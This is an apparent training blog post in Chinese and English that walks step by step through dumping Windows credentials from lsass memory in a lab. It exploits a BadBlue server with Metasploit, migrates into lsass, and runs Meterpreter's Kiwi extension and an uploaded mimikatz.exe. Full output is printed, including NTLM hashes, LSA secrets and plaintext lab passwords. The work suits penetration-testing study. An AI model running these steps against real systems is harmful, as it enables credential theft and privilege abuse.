---
layout: post
title: "Dumping Hashes With Mimikatz"
date: "2022-10-08"
author: "r3kind1e"
header-img: "img/post-bg-Penetration Testing Student.png"
catalog:    true
tags: 
    - Penetration Testing Student v2
    - Host & Network Penetration Testing
    - System/Host Based Attacks
---

# Dumping Hashes With Mimikatz（使用 Mimikatz 转储哈希）
## Mimikatz
Mimikatz 是 Benjamin Delpy (@gentilkiwi) 编写的 Windows 后期利用工具。 它允许从内存中提取明文密码、哈希和 Kerberos 票证。

SAM（安全帐户管理器）数据库是 Windows 系统上存储散列用户密码的数据库文件。

Mimikatz 可用于从缓存哈希的 lsass.exe 进程内存中提取哈希。

Open up task manager on Windows system, take a look at the services or processes that you may have noticed a process called lsass.exe. LSA stands for local security authority and LSASS stands for local security authority subsystem, this process is reponsible for authenticating users, and part of that process involves interacting with the SAM database. As a result, the LSASS process will stored the data that is retriving from the SAM database, data like administrator or user hashes, and it will stored them in its memory, so within RAM. What Mimikatz does is extracts the hashes from the lsass process memory where the hashes are been cached.

我们可以使用预编译的 mimitatz 可执行文件，或者，如果我们可以访问 Windows 目标上的 Meterpreter 会话，我们可以使用内置的 Meterpreter 扩展 Kiwi。

A great thing about kiwi, it allows you to extract hashes from memory, directly from within memory, so you not upload mimitatz binaries or executables onto the target. Everything is been executed in memory, so you not leave any artifact on the system.

注意：Mimikatz 需要提升权限才能正确运行。

The reason for that is because lsass.exe process is a privileged process run with system privileges. In order to interact with it, you need to have adminisrator privileges or system privilegs.

# Demo: Dumping Hashes With Mimikatz（演示：使用 Mimikatz 转储哈希）
```
Target IP Address: 10.2.18.199
```

```
nmap -sV 10.2.18.199
```

```
service postgresql start && msfconsole

search badblue
use exploit/windows/http/badblue_passthru
show options
set RHOST 10.2.18.199
exploit
```

```
meterpreter > sysinfo
meterpreter > getuid
Server username: ATTACKDEFENSE\Administrator
```

Migrate to lsass.exe process, find the process id of lsass service. Because we have administrator privileges, we can migrate to any process. `NT AUTHORITY\SYSTEM` is the highest privileges on Windows system.

```
meterpreter > pgrep lsass
788
meterpreter > migrate 788
meterpreter > getuid
Server username: NT AUTHORITY\SYSTEM
```

Let's start first and foremost with kiwi module, which is an inbuilt meterpreter extension.

```
meterpreter > load kiwi
meterpreter > ?
Kiwi Commands
=============
Commands                Description
--------                -----------
creds_all               Retrieve all credentials (parsed)
lsa_dump_sam            Dump LSA SAM (unparsed)
```

That will dump all credentials. We get NTML hash of the Administrator user. And in terms of wdigest credentials and kerberos credentials, you can see that no clear-text passwords are specified. The reason that is the key because Windows version later than 8.1 do not store clear-text passwords at all. But we still able to get NTLM hashes.

```
meterpreter > creds_all
```

That is going to dump all the NTLM hashes for all the user accounts on the system. SAM database is encrypted with the syskey. We also get the SAMKey here.

```
meterpreter > lsa_dump_sam
```

In certain situation, this particular or dump lsa secrets could provide you with some clear-text credentials in some cases.

```
meterpreter > lsa_dump_secrets
```

You can also dump `creds_wdigest`, which we did because we ran `creds_all` command.
If you are working with an active directory environment, you can create golden ticket, golden kerberos ticket for that matter. And of course, you can list all kerberos tickets.

In terms of what we are doing, another great tool you can run is `password_change`. During a penetration test, I would not recommend doing that, because you obviously change an account password that is been used in a production environment.

```
meterpreter > ?
Kiwi Commands
=============
Commands                Description
--------                -----------
golden_ticket_create    Create a golden kerberos ticket.
kerberos_ticket_list    List all kerberos tickets (unparsed)

password_change         Change the password/hash of a user.
```

Kali Linux already have mimikatz executable availble for you.

```
meterpreter > pwd
meterpreter > cd C:\\
meterpreter > mkdir Temp
meterpreter > cd Temp
meterpreter > upload /usr/share/windows-resources/mimikatz/x64/mimikatz.exe
meterpreter > shell
```

Check wether you have proper privileges. That means you have required privileges in oerder to perfrom hashes extraction from memory.

```
C:\Temp>dir
C:\Temp>.\mimikatz.exe
mimikatz # privilege::debug
Privilege '20' OK
```

Dump the contents of SAM database, or rather dump the cache of the lsa or lsass process.

It provides you with domain, syskey and SAMKey. And for administrator, you have RID, which in this case is 500, which confirms this indeed is administrator users. You then have NTML hash right over here.

```
mimikatz # lsadump::sam
```

Dump LSA sercerts:

```
mimikatz # lsadump::secrets
```

One great thing we can do with mimikatz executable is to **display logon passwords**. Whenver a user logs on to Windows, if the system has been configured to store logon passwords in memory in clear text rather mimikatz can show you this passwords.

In this case, the system has been configured very well in that it not display any clear-text password. Clear-text password has been disabled on the system. If it won't, we should be able to get clear-text passwords.

```
mimikatz # sekurlsa::logonpasswords
```

# Home Lab
环境：Windows 7 SP1

```
meterpreter > sysinfo
Computer        : IEWIN7
OS              : Windows 7 (6.1 Build 7601, Service Pack 1).
Architecture    : x64
System Language : en_US
Domain          : WORKGROUP
Logged On Users : 2
Meterpreter     : x64/windows
meterpreter > getuid
Server username: IEWIN7\IEUser
meterpreter > pgrep lsass
496
meterpreter > migrate 496
[*] Migrating from 3164 to 496...
[*] Migration completed successfully.
meterpreter > getuid
Server username: NT AUTHORITY\SYSTEM
```

```
meterpreter > load kiwi
Loading extension kiwi...
  .#####.   mimikatz 2.2.0 20191125 (x64/windows)
 .## ^ ##.  "A La Vie, A L'Amour" - (oe.eo)
 ## / \ ##  /*** Benjamin DELPY `gentilkiwi` ( benjamin@gentilkiwi.com )
 ## \ / ##       > http://blog.gentilkiwi.com/mimikatz
 '## v ##'        Vincent LE TOUX            ( vincent.letoux@gmail.com )
  '#####'         > http://pingcastle.com / http://mysmartlogon.com  ***/

Success.
meterpreter > ?

Kiwi Commands
=============

    Command                Description
    -------                -----------
    creds_all              Retrieve all credentials (parsed)
    creds_kerberos         Retrieve Kerberos creds (parsed)
    creds_livessp          Retrieve Live SSP creds
    creds_msv              Retrieve LM/NTLM creds (parsed)
    creds_ssp              Retrieve SSP creds
    creds_tspkg            Retrieve TsPkg creds (parsed)
    creds_wdigest          Retrieve WDigest creds (parsed)
    dcsync                 Retrieve user account information via DCSync (unparsed)
    dcsync_ntlm            Retrieve user account NTLM hash, SID and RID via DCSync
    golden_ticket_create   Create a golden kerberos ticket
    kerberos_ticket_list   List all kerberos tickets (unparsed)
    kerberos_ticket_purge  Purge any in-use kerberos tickets
    kerberos_ticket_use    Use a kerberos ticket
    kiwi_cmd               Execute an arbitary mimikatz command (unparsed)
    lsa_dump_sam           Dump LSA SAM (unparsed)
    lsa_dump_secrets       Dump LSA secrets (unparsed)
    password_change        Change the password/hash of a user
    wifi_list              List wifi profiles/creds for the current user
    wifi_list_shared       List shared wifi profiles/creds (requires SYSTEM)
```

```
Kiwi命令
==============

    命令     说明
    -------- -----------
    creds_all 检索所有凭据（已解析）
    creds_kerberos 检索 Kerberos 凭据（已解析）
    creds_livessp 检索实时 SSP 凭据
    creds_msv 检索 LM/NTLM 凭据（已解析）
    creds_ssp 检索 SSP 凭据
    creds_tspkg 检索 TsPkg 凭据（已解析）
    creds_wdigest 检索 WDigest 凭据（已解析）
    dcsync 通过 DCSync 检索用户帐户信息（未解析）
    dcsync_ntlm 通过 DCSync 检索用户帐户 NTLM 哈希、SID 和 RID
    Golden_ticket_create 创建黄金 kerberos 票证
    kerberos_ticket_list 列出所有 kerberos 票证（未解析）
    kerberos_ticket_purge 清除所有正在使用的 kerberos 票证
    kerberos_ticket_use 使用 kerberos 票证
    kiwi_cmd 执行任意的 mimikatz 命令（未解析）
    lsa_dump_sam 转储 LSA SAM（未解析）
    lsa_dump_secrets 转储 LSA 机密（未解析）
    password_change 更改用户的密码/哈希
    wifi_list 列出当前用户的 wifi 配置文件/凭据
    wifi_list_shared 列出共享的 wifi 配置文件/凭据（需要 SYSTEM）
```

```
meterpreter > creds_all
[+] Running as SYSTEM
[*] Retrieving all credentials
msv credentials
===============

Username     Domain  NTLM                              SHA1
--------     ------  ----                              ----
IEUser       IEWIN7  fc525c9683e8fe067095ba2ddc971889  e53d7244aa8727f5789b01d8959141960aad5d22
sshd_server  IEWIN7  8d0a16cfc061c3359db455d00ec27035  94bd2df8ae5cadbbb5757c3be01dd40c27f9362f

wdigest credentials
===================

Username     Domain     Password
--------     ------     --------
(null)       (null)     (null)
IEUser       IEWIN7     Passw0rd!
IEWIN7$      WORKGROUP  (null)
sshd_server  IEWIN7     D@rj33l1ng

kerberos credentials
====================

Username     Domain     Password
--------     ------     --------
(null)       (null)     (null)
IEUser       IEWIN7     (null)
iewin7$      WORKGROUP  (null)
sshd_server  IEWIN7     (null)
```

```
meterpreter > lsa_dump_sam
[+] Running as SYSTEM
[*] Dumping SAM
Domain : IEWIN7
SysKey : 358fdae41881dad749ff1fefa2ce5c87
Local SID : S-1-5-21-1610009768-122519599-941061767

SAMKey : 0ad488298582e857353608d070ebc111

RID  : 000001f4 (500)
User : Administrator
  Hash NTLM: fc525c9683e8fe067095ba2ddc971889

RID  : 000001f5 (501)
User : Guest

RID  : 000003e8 (1000)
User : IEUser
  Hash NTLM: fc525c9683e8fe067095ba2ddc971889

RID  : 000003e9 (1001)
User : sshd

RID  : 000003ea (1002)
User : sshd_server
  Hash NTLM: 8d0a16cfc061c3359db455d00ec27035

RID  : 000003eb (1003)
User : albedo
  Hash NTLM: 3dbde697d71690a769204beb12283678

RID  : 000003ec (1004)
User : unpriv
  Hash NTLM: 3dbde697d71690a769204beb12283678
```

```
meterpreter > lsa_dump_secrets
[+] Running as SYSTEM
[*] Dumping LSA secrets
Domain : IEWIN7
SysKey : 358fdae41881dad749ff1fefa2ce5c87

Local name : IEWIN7 ( S-1-5-21-1610009768-122519599-941061767 )
Domain name : WORKGROUP

Policy subsystem is : 1.11
LSA Key(s) : 1, default {f409f8e1-3371-f835-61d2-1f4e14c89687}
  [00] {f409f8e1-3371-f835-61d2-1f4e14c89687} 0293a24c3cf7c25d333b13f7814bd2ccde82e2b1c18391f76fb890b01f5fa225

Secret  : DefaultPassword
cur/text: Passw0rd!
old/text: ROOT#123

Secret  : DPAPI_SYSTEM
cur/hex : 01 00 00 00 d7 e7 10 e0 e1 fe e9 a6 fa 72 6c e5 6d bd f2 fb b3 20 2d 1e ac 17 fe 50 74 dd ae a2 1a 32 dc d9 18 b6 5f 26 91 b1 dd c4 
    full: d7e710e0e1fee9a6fa726ce56dbdf2fbb3202d1eac17fe5074ddaea21a32dcd918b65f2691b1ddc4
    m/u : d7e710e0e1fee9a6fa726ce56dbdf2fbb3202d1e / ac17fe5074ddaea21a32dcd918b65f2691b1ddc4
old/hex : 01 00 00 00 37 e8 8b b1 d4 c5 05 d8 90 64 8b 7d 45 38 85 3c 20 f8 5e 77 80 5e 7f 25 b2 fc dd 7d 22 33 6b 26 b5 53 0c ea 4e e4 f4 cc 
    full: 37e88bb1d4c505d890648b7d4538853c20f85e77805e7f25b2fcdd7d22336b26b5530cea4ee4f4cc
    m/u : 37e88bb1d4c505d890648b7d4538853c20f85e77 / 805e7f25b2fcdd7d22336b26b5530cea4ee4f4cc

Secret  : _SC_OpenSSHd / service 'OpenSSHd' with username : .\sshd_server
cur/text: D@rj33l1ng

```

```
meterpreter > upload /usr/share/windows-resources/mimikatz/x64/mimikatz.exe
[*] uploading  : /usr/share/windows-resources/mimikatz/x64/mimikatz.exe -> mimikatz.exe
[*] Uploaded 1.29 MiB of 1.29 MiB (100.0%): /usr/share/windows-resources/mimikatz/x64/mimikatz.exe -> mimikatz.exe
[*] uploaded   : /usr/share/windows-resources/mimikatz/x64/mimikatz.exe -> mimikatz.exe
```

```
meterpreter > shell
Process 3416 created.
Channel 2 created.
Microsoft Windows [Version 6.1.7601]
Copyright (c) 2009 Microsoft Corporation.  All rights reserved.

C:\Temp>.\mimikatz.exe
.\mimikatz.exe

  .#####.   mimikatz 2.2.0 (x64) #19041 Aug 10 2021 17:19:53
 .## ^ ##.  "A La Vie, A L'Amour" - (oe.eo)
 ## / \ ##  /*** Benjamin DELPY `gentilkiwi` ( benjamin@gentilkiwi.com )
 ## \ / ##       > https://blog.gentilkiwi.com/mimikatz
 '## v ##'       Vincent LE TOUX             ( vincent.letoux@gmail.com )
  '#####'        > https://pingcastle.com / https://mysmartlogon.com ***/

mimikatz # privilege::debug
Privilege '20' OK

```

```
mimikatz # lsadump::sam
Domain : IEWIN7
SysKey : 358fdae41881dad749ff1fefa2ce5c87
Local SID : S-1-5-21-1610009768-122519599-941061767

SAMKey : 0ad488298582e857353608d070ebc111

RID  : 000001f4 (500)
User : Administrator
  Hash NTLM: fc525c9683e8fe067095ba2ddc971889

RID  : 000001f5 (501)
User : Guest

RID  : 000003e8 (1000)
User : IEUser
  Hash NTLM: fc525c9683e8fe067095ba2ddc971889

RID  : 000003e9 (1001)
User : sshd

RID  : 000003ea (1002)
User : sshd_server
  Hash NTLM: 8d0a16cfc061c3359db455d00ec27035

RID  : 000003eb (1003)
User : albedo
  Hash NTLM: 9a27e562f08a874ac72987a0ec740be0

RID  : 000003ec (1004)
User : unpriv
  Hash NTLM: 3dbde697d71690a769204beb12283678
```

```
mimikatz # lsadump::secrets
Domain : IEWIN7
SysKey : 358fdae41881dad749ff1fefa2ce5c87

Local name : IEWIN7 ( S-1-5-21-1610009768-122519599-941061767 )
Domain name : WORKGROUP

Policy subsystem is : 1.11
LSA Key(s) : 1, default {f409f8e1-3371-f835-61d2-1f4e14c89687}
  [00] {f409f8e1-3371-f835-61d2-1f4e14c89687} 0293a24c3cf7c25d333b13f7814bd2ccde82e2b1c18391f76fb890b01f5fa225

Secret  : DefaultPassword
cur/text: Passw0rd!
old/text: ROOT#123

Secret  : DPAPI_SYSTEM
cur/hex : 01 00 00 00 d7 e7 10 e0 e1 fe e9 a6 fa 72 6c e5 6d bd f2 fb b3 20 2d 1e ac 17 fe 50 74 dd ae a2 1a 32 dc d9 18 b6 5f 26 91 b1 dd c4 
    full: d7e710e0e1fee9a6fa726ce56dbdf2fbb3202d1eac17fe5074ddaea21a32dcd918b65f2691b1ddc4
    m/u : d7e710e0e1fee9a6fa726ce56dbdf2fbb3202d1e / ac17fe5074ddaea21a32dcd918b65f2691b1ddc4
old/hex : 01 00 00 00 37 e8 8b b1 d4 c5 05 d8 90 64 8b 7d 45 38 85 3c 20 f8 5e 77 80 5e 7f 25 b2 fc dd 7d 22 33 6b 26 b5 53 0c ea 4e e4 f4 cc 
    full: 37e88bb1d4c505d890648b7d4538853c20f85e77805e7f25b2fcdd7d22336b26b5530cea4ee4f4cc
    m/u : 37e88bb1d4c505d890648b7d4538853c20f85e77 / 805e7f25b2fcdd7d22336b26b5530cea4ee4f4cc

Secret  : _SC_OpenSSHd / service 'OpenSSHd' with username : .\sshd_server
cur/text: D@rj33l1ng
```

Display logon passwords.

```
mimikatz # sekurlsa::logonpasswords

Authentication Id : 0 ; 132660 (00000000:00020634)
Session           : Interactive from 1
User Name         : IEUser
Domain            : IEWIN7
Logon Server      : IEWIN7
Logon Time        : 10/8/2022 8:04:26 PM
SID               : S-1-5-21-1610009768-122519599-941061767-1000
        msv :
         [00010000] CredentialKeys
         * NTLM     : fc525c9683e8fe067095ba2ddc971889
         * SHA1     : e53d7244aa8727f5789b01d8959141960aad5d22
         [00000003] Primary
         * Username : IEUser
         * Domain   : IEWIN7
         * NTLM     : fc525c9683e8fe067095ba2ddc971889
         * SHA1     : e53d7244aa8727f5789b01d8959141960aad5d22
        tspkg :
        wdigest :
         * Username : IEUser
         * Domain   : IEWIN7
         * Password : Passw0rd!
        kerberos :
         * Username : IEUser
         * Domain   : IEWIN7
         * Password : (null)
        ssp :
        credman :

Authentication Id : 0 ; 104736 (00000000:00019920)
Session           : Service from 0
User Name         : sshd_server
Domain            : IEWIN7
Logon Server      : IEWIN7
Logon Time        : 10/8/2022 8:04:25 PM
SID               : S-1-5-21-1610009768-122519599-941061767-1002
        msv :
         [00010000] CredentialKeys
         * NTLM     : 8d0a16cfc061c3359db455d00ec27035
         * SHA1     : 94bd2df8ae5cadbbb5757c3be01dd40c27f9362f
         [00000003] Primary
         * Username : sshd_server
         * Domain   : IEWIN7
         * NTLM     : 8d0a16cfc061c3359db455d00ec27035
         * SHA1     : 94bd2df8ae5cadbbb5757c3be01dd40c27f9362f
        tspkg :
        wdigest :
         * Username : sshd_server
         * Domain   : IEWIN7
         * Password : D@rj33l1ng
        kerberos :
         * Username : sshd_server
         * Domain   : IEWIN7
         * Password : (null)
        ssp :
        credman :

Authentication Id : 0 ; 997 (00000000:000003e5)
Session           : Service from 0
User Name         : LOCAL SERVICE
Domain            : NT AUTHORITY
Logon Server      : (null)
Logon Time        : 10/8/2022 8:04:24 PM
SID               : S-1-5-19
        msv :
        tspkg :
        wdigest :
         * Username : (null)
         * Domain   : (null)
         * Password : (null)
        kerberos :
         * Username : (null)
         * Domain   : (null)
         * Password : (null)
        ssp :
        credman :

Authentication Id : 0 ; 996 (00000000:000003e4)
Session           : Service from 0
User Name         : IEWIN7$
Domain            : WORKGROUP
Logon Server      : (null)
Logon Time        : 10/8/2022 8:04:24 PM
SID               : S-1-5-20
        msv :
        tspkg :
        wdigest :
         * Username : IEWIN7$
         * Domain   : WORKGROUP
         * Password : (null)
        kerberos :
         * Username : iewin7$
         * Domain   : WORKGROUP
         * Password : (null)
        ssp :
        credman :

Authentication Id : 0 ; 50117 (00000000:0000c3c5)
Session           : UndefinedLogonType from 0
User Name         : (null)
Domain            : (null)
Logon Server      : (null)
Logon Time        : 10/8/2022 8:04:23 PM
SID               : 
        msv :
        tspkg :
        wdigest :
        kerberos :
        ssp :
        credman :

Authentication Id : 0 ; 999 (00000000:000003e7)
Session           : UndefinedLogonType from 0
User Name         : IEWIN7$
Domain            : WORKGROUP
Logon Server      : (null)
Logon Time        : 10/8/2022 8:04:23 PM
SID               : S-1-5-18
        msv :
        tspkg :
        wdigest :
         * Username : IEWIN7$
         * Domain   : WORKGROUP
         * Password : (null)
        kerberos :
         * Username : iewin7$
         * Domain   : WORKGROUP
         * Password : (null)
        ssp :
        credman :

```